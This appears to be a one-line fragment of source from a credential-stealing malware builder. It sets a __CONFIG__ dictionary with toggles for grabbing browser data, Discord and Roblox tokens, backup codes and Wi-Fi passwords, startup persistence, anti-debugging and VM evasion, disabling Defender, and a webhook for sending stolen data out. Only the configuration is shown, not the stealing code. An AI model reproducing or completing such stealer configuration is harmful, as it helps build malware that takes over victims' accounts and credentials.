...
__CONFIG__ = {'webhook': None, 'ping': False, 'pingtype': 'Everyone', 'error': True, 'startup': True, 'defender': False, 'systeminfo': False, 'backupcodes': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': False, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False}
